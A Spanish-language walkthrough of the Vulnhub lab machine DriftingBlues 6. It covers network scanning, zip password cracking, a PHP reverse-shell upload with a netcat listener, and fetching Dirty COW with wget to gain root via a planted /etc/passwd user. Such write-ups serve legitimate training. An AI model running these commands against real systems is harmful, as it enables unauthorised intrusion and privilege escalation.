---
title: DriftingBlues 6 Writeup - Vulnhub
date: 2025-01-25
categories: [Writeups, Vulnhub]
tags: [Linux, Vulnhub, CTF, Easy, HTTP, DriftingBlues, fcrackzip, DirtyCow, fileupload]
image:
  path: /assets/img/commons/vulnhub/vulnhub.jpg
---

Resolución máquina anterior: [**DriftingBlues5**](https://lvs3c.github.io/posts/DriftingBlues-5/)

¡Saludos!

En este writeup, nos adentraremos en la máquina [**DriftingBlues6**](https://www.vulnhub.com/entry/driftingblues-6,672/), la cual tiene un nivel de dificultad **fácil** según la plataforma. Se trata de una máquina **Linux** en la cual veremos **enumeración de servicios**, **fuzzing** de directorios y archivos con `gobuster`, **fcrackzip** para desencriptar un archivo `zip` y obtener credenciales de un panel de administración, **file upload** para generarnos una reverse shell y usaremos el exploit **DirtyCow** para elevar nuestros privilegios como usuario **root**, obteniendo así la flag del CTF.

¡Empecemos!

## Reconocimiento activo

---

Necesitamos encontrar la ip correspondiente a la máquina, lo hacemos mediante la herramienta `arp-scan` y posteriormente el comando `ping` para verificar si la máquina objetivo está activa.

```bash
❯ arp-scan -I ens32 --localnet --ignoredups
Interface: ens32, type: EN10MB, MAC: 00:0c:29:c4:47:79, IPv4: 10.11.12.10
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
10.11.12.1      00:50:56:c0:00:01       VMware, Inc.
10.11.12.36     00:0c:29:3f:d1:c7       VMware, Inc.
10.11.12.254    00:50:56:f6:71:b0       VMware, Inc.

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.457 seconds (104.19 hosts/sec). 3 responded
```

```bash
❯ ping -c 1 10.11.12.36
PING 10.11.12.36 (10.11.12.36) 56(84) bytes of data.
64 bytes from 10.11.12.36: icmp_seq=1 ttl=64 time=0.458 ms

--- 10.11.12.36 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.458/0.458/0.458/0.000 ms
```

## Escaneo

---

A continuación, realizamos un escaneo con `Nmap` para identificar los puertos abiertos en el sistema objetivo.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -n -Pn 10.11.12.36 -oG nmap_ports
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:37 -03
Nmap scan report for 10.11.12.36
Host is up (0.0013s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 00:0C:29:3F:D1:C7 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 5.66 seconds
```

## Enumeración

---

Seguidamente, efectuamos una enumeración de las versiones de los servicios asociados a los puertos abiertos. Además, ejecutamos un conjunto de scripts predeterminados de `Nmap` para realizar pruebas complementarias sobre los puertos y servicios identificados.

```bash
❯ nmap -p80 -sCV 10.11.12.36 -oN nmap_services
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:38 -03
Nmap scan report for 10.11.12.36
Host is up (0.00029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
|_http-server-header: Apache/2.2.22 (Debian)
|_http-title: driftingblues
| http-robots.txt: 1 disallowed entry
|_/textpattern/textpattern
MAC Address: 00:0C:29:3F:D1:C7 (VMware)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.15 seconds
```

El informe de `Nmap` nos revela:
- Puerto `80` servidor `Apache 2.2.22`.


### HTTP - 80

Hacemos un análisis de la web con `whatweb` para ver su tecnología.

```bash
❯ whatweb http://10.11.12.36/
http://10.11.12.36/ [200 OK] Apache[2.2.22], Country[RESERVED][ZZ], HTML5, HTTPServer[Debian Linux][Apache/2.2.22 (Debian)], IP[10.11.12.36], Title[driftingblues]
```

![dbsix](/assets/img/commons/vulnhub/DriftingBlues6/dbsix.png){: .center-image }

Continuamos realizando un fuzzing de directorios rápido con el script `http-enum` de nmap.

```bash
❯ nmap -p80 --script http-enum 10.11.12.36 -oN nmap_webscan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-30 14:41 -03
Nmap scan report for 10.11.12.36
Host is up (0.00028s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|_  /robots.txt: Robots file
MAC Address: 00:0C:29:3F:D1:C7 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 7.12 seconds
```

Validamos el contenido del archivo `robots.txt`.

![robots](/assets/img/commons/vulnhub/DriftingBlues6/robots.png){: .normal }

Verificamos el path y vemos un portal de login.

![textpattern](/assets/img/commons/vulnhub/DriftingBlues6/textpattern.png){: .normal }

De igual manera, corremos `gobuster` para validar directorios o archivos ocultos, porque también el archivo *robots.txt* nos decía que incluyamos en nuestro fuzzing la extensión `.zip`{: .filepath}.

```bash
❯ gobuster dir -u http://10.11.12.36/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -t 10 -x php,html,php.bak,bak,sh,txt,.htpasswd,.htaccess,.key,key,.txt,zip,rar,tar,7z,gzip1,jpg,gif,jpeg,sql,.sql,pcap,.pcap -o go_driftingblues_6.log -e
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.11.12.36/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,htpasswd,htaccess,key,jpeg,php,rar,7z,gif,pcap,bak,tar,jpg,sql,html,php.bak,sh,zip,gzip1
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://10.11.12.36/.html                (Status: 403) [Size: 284]
http://10.11.12.36/.htpasswd            (Status: 403) [Size: 288]
http://10.11.12.36/.htaccess            (Status: 403) [Size: 288]
http://10.11.12.36/.php                 (Status: 403) [Size: 283]
http://10.11.12.36/index.html           (Status: 200) [Size: 750]
http://10.11.12.36/index                (Status: 200) [Size: 750]
http://10.11.12.36/db                   (Status: 200) [Size: 53656]
http://10.11.12.36/robots               (Status: 200) [Size: 110]
http://10.11.12.36/robots.txt           (Status: 200) [Size: 110]
http://10.11.12.36/spammer              (Status: 200) [Size: 179]
http://10.11.12.36/spammer.zip          (Status: 200) [Size: 179]
```

Descargamos el recurso `spammer.zip` y tendremos que crackearlo porque está bajo contraseña, usamos `fcrackzip` y obtenemos las credenciales de acceso.

```bash
❯ fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt spammer.zip

PASSWORD FOUND!!!!: pw == myspace4

❯ unzip spammer.zip
Archive:  spammer.zip
[spammer.zip] creds.txt password:
 extracting: creds.txt

❯ ls
 creds.txt   spammer.zip

❯ cat creds.txt
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: creds.txt
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ mayer:lionheart
```

Ingresamos al portal de administración con las credenciales. 

Nos dirijimos a las preferencias del *admin* y notamos un directorio para subir archivos.

![admin-profile](/assets/img/commons/vulnhub/DriftingBlues6/admin-profile.png){: .normal }

Intentamos subir un archivo para generarnos la reverse shell y ya tenemos el path donde se va a guardar `/var/www/textpattern/files`.

![reverse-shell](/assets/img/commons/vulnhub/DriftingBlues6/reverse-shell.png){: .normal }

![files](/assets/img/commons/vulnhub/DriftingBlues6/files.png){: .normal }

## Explotación

---

Nos ponemos en escucha desde nuestra máquina atacante `sudo rlwrap nc -nlvp 443`, abrimos el archivo rs.php y generamos la conexión.

El archivo reverse shell que utilizamos, viene en nuestro parrot o kali, situado en `/usr/share/webshells/php/php-reverse-shell.php`.

```bash
❯ sudo rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.11.12.10] from (UNKNOWN) [10.11.12.36] 60617
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linux
 12:29:21 up 36 min,  0 users,  load average: 0.01, 0.54, 0.55
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
www-data@driftingblues:/$ whoami
www-data
```


## Escalación de privilegios

---

Listando el kernel del sistema operativo, nos damos cuenta que es obsoleto, buscamos en searchsploit algún exploit para dicha versión.

```bash
uname -a
Linux driftingblues 3.2.0-4-amd64 #1 SMP Debian 3.2.78-1 x86_64 GNU/Linu
```

Searchsploit

```bash
❯ searchsploit linux 3.2.0

Linux < 4.14.103 / < 4.19.25 - Out-of-Bounds Read and Write in SNMP NAT Module           | linux/dos/46477.txt
Linux < 4.16.9 / < 4.14.41 - 4-byte Infoleak via Uninitialized Struct Field in compat ad | linux/dos/44641.c
Linux < 4.20.14 - Virtual Address 0 is Mappable via Privileged write() to /proc/*/mem    | linux/dos/46502.txt
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                        | linux/local/50135.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privileg | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalati | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Met | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escal | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Meth | linux/local/40611.c
Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64) - 'Mempodipper' Local Privilege Es | linux/local/18411.c
Linux Kernel 2.6.39 < 3.2.2 (x86/x64) - 'Mempodipper' Local Privilege Escalation (2)     | linux/local/35161.c
Linux Kernel 3.0 < 3.3.5 - 'CLONE_NEWUSER|CLONE_FS' Local Privilege Escalation           | linux/local/38390.c
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Esca | linux_x86-64/local/33516.c
Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init'  | linux_x86-64/local/33589.c
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                     | linux/dos/43234.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                               | linux/local/41886.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                        | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation             | linux_x86-64/local/44302.c
Linux Kernel < 3.2.0-23 (Ubuntu 12.04 x64) - 'ptrace/sysret' Local Privilege Escalation  | linux_x86-64/local/34134.c
Linux Kernel < 3.4.5 (Android 4.2.2/4.4 ARM) - Local Privilege Escalation                | arm/local/31574.c
Linux Kernel < 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege E | linux_x86-64/local/44299.c
Linux Kernel < 3.8.9 (x86-64) - 'perf_swevent_init' Local Privilege Escalation (2)       | linux_x86-64/local/26131.c
Linux Kernel < 3.8.x - open-time Capability 'file_ns_capable()' Local Privilege Escalati | linux/local/25450.c
Linux Kernel < 4.10.13 - 'keyctl_set_reqkey_keyring' Local Denial of Service             | linux/dos/42136.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                             | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation        | linux/local/45553.c
Linux Kernel < 4.13.1 - BlueTooth Buffer Overflow (PoC)                                  | linux/dos/42762.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation            | linux/local/45010.c
Linux Kernel < 4.14.rc3 - Local Denial of Service                                        | linux/dos/42932.c
Linux Kernel < 4.15.4 - 'show_floppy' KASLR Address Leak                                 | linux/local/44325.c
Linux Kernel < 4.16.11 - 'ext4_read_inline_data()' Memory Corruption                     | linux/dos/44832.txt
Linux Kernel < 4.17-rc1 - 'AF_LLC' Double Free                                           | linux/dos/44579.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                   | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege E | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation ( | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Pr | linux/local/47169.c
Linux Kernel < 4.5.1 - Off-By-One (PoC)                                                  | linux/dos/44301.c
```
Vamos a utilizar el exploit [`Dirty COW`](https://www.exploit-db.com/exploits/40839). 

Lo compartimos con la máquina víctima y lo ejecutamos.

```bash
www-data@driftingblues:/tmp$ wget 10.11.12.10/dirty.c
www-data@driftingblues:/tmp$ gcc -pthread dirty.c -o dirty -lcrypt
www-data@driftingblues:/tmp$ ./dirty
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash

mmap: 7fa15116c000
id

madvise 0

ptrace 0
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
Done! Check /etc/passwd to see if the new user was created.
You can log in with the username 'firefart' and the password ''.


DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
```

Listamos la Flag.

```bash
www-data@driftingblues:/$ su - firefart
Password: password
firefart@driftingblues:~# cd /root
firefart@driftingblues:~# ls
flag.txt
firefart@driftingblues:~# cat flag.txt

░░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄▄
░░░░░█░░░░░░░░░░░░░░░░░░▀▀▄
░░░░█░░░░░░░░░░░░░░░░░░░░░░█
░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█
░▄▀░▄▄▄░░█▀▀▀▀▄▄█░░░██▄▄█░░░░█
█░░█░▄░▀▄▄▄▀░░░░░░░░█░░░░░░░░░█
█░░█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄░█
░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█
░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█
░░░█░░░░██░░▀█▄▄▄█▄▄█▄▄██▄░░█
░░░░█░░░░▀▀▄░█░░░█░█▀█▀█▀██░█
░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█
░░░░░░░▀▄▄░░░░░░░░░░░░░░░░░░░█
░░▐▌░█░░░░▀▀▄▄░░░░░░░░░░░░░░░█
░░░█▐▌░░░░░░█░▀▄▄▄▄▄░░░░░░░░█
░░███░░░░░▄▄█░▄▄░██▄▄▄▄▄▄▄▄▀
░▐████░░▄▀█▀█▄▄▄▄▄█▀▄▀▄
░░█░░▌░█░░░▀▄░█▀█░▄▀░░░█
░░█░░▌░█░░█░░█░░░█░░█░░█
░░█░░▀▀░░██░░█░░░█░░█░░█
░░░▀▀▄▄▀▀░█░░░▀▄▀▀▀▀█░░█

congratulations!
```

Hope it helps!